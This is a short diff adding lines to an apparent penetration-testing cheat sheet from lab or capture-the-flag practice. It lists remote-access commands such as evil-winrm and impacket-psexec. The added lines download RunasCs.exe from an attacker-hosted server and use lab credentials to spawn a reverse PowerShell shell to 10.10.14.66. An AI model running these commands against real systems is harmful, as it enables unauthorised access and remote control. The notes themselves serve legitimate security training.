@@ -14,6 +14,9 @@ xfreerdp /v:192.168.197.196 /u:offsec /p:lab
 evil-winrm -i <target IP> -u Administrator -p <password>
 impacket-psexec administrator@10.129.183.142   -> shell via SMB
 
+iwr http://10.10.14.66:8000/RunasCs-master/RunasCs.exe -outfile c:\temp\runascs.exe
+./RunasCs.exe mikasaAckerman IL0v3ErenY3ager powershell -r 10.10.14.66:9100
+
 
 ______________________
 
